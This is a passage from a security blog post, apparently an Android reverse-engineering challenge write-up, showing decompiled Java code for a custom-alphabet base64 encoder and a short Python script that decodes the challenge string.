98, 99, 100, 85, 86, 87, 88, 89, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 56, 57, 43, 47 &#125;;</span><br><span class="line">  private static final int RANGE &#x3D; 255;</span><br><span class="line">  private static byte[] StrToBase64Byte &#x3D; new byte[&#39;?&#39;];</span><br><span class="line">  </span><br><span class="line">  public String Base64Encode(byte[] paramArrayOfByte)</span><br><span class="line">  &#123;</span><br><span class="line">    StringBuilder localStringBuilder &#x3D; new StringBuilder();</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; paramArrayOfByte.length - 1; i +&#x3D; 3)</span><br><span class="line">    &#123;</span><br><span class="line">      byte[] arrayOfByte &#x3D; new byte[4];</span><br><span class="line">      int j &#x3D; 0;</span><br><span class="line">      int k &#x3D; 0;</span><br><span class="line">      if (k &lt;&#x3D; 2)</span><br><span class="line">      &#123;</span><br><span class="line">        if (i + k &lt;&#x3D; paramArrayOfByte.length - 1) &#123;</span><br><span class="line">          arrayOfByte[k] &#x3D; ((byte)(byte)((paramArrayOfByte[(i + k)] &amp; 0xFF) &gt;&gt;&gt; k * 2 + 2 | j));</span><br><span class="line">        &#125;</span><br><span class="line">        for (j &#x3D; (byte)(((paramArrayOfByte[(i + k)] &amp; 0xFF) &lt;&lt; (2 - k) * 2 + 2 &amp; 0xFF) &gt;&gt;&gt; 2);; j &#x3D; 64)</span><br><span class="line">        &#123;</span><br><span class="line">          k++;</span><br><span class="line">          break;</span><br><span class="line">          arrayOfByte[k] &#x3D; ((byte)j);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      arrayOfByte[3] &#x3D; ((byte)j);</span><br><span class="line">      j &#x3D; 0;</span><br><span class="line">      if (j &lt;&#x3D; 3)</span><br><span class="line">      &#123;</span><br><span class="line">        if (arrayOfByte[j] &lt;&#x3D; 63) &#123;</span><br><span class="line">          localStringBuilder.append(Base64ByteToStr[arrayOfByte[j]]);</span><br><span class="line">        &#125;</span><br><span class="line">        for (;;)</span><br><span class="line">        &#123;</span><br><span class="line">          j++;</span><br><span class="line">          break;</span><br><span class="line">          localStringBuilder.append(&#39;&#x3D;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上加密是对输入进行了一个base64换表的加密</p>
<p>解密脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_table &#x3D; [ 118, 119, 120, 114, 115, 116, 117, 111, 112, 113, 51, 52, 53, 54, 55, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 121, 122, 48, 49, 50, 80, 81, 82, 83, 84, 75, 76, 77, 78, 79, 90, 97, 98, 99, 100, 85, 86, 87, 88, 89, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 56, 57, 43, 47 ];</span><br><span class="line">string1 &#x3D; &#39;&#39;</span><br><span class="line">code &#x3D; &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(len(base_table)):</span><br><span class="line">    string1 +&#x3D; chr(base_table[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(code.translate(str.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/07/android-revese-0/" data-id="ckhemv84g005bwdcm3pfh88nf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/" rel="tag">android</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>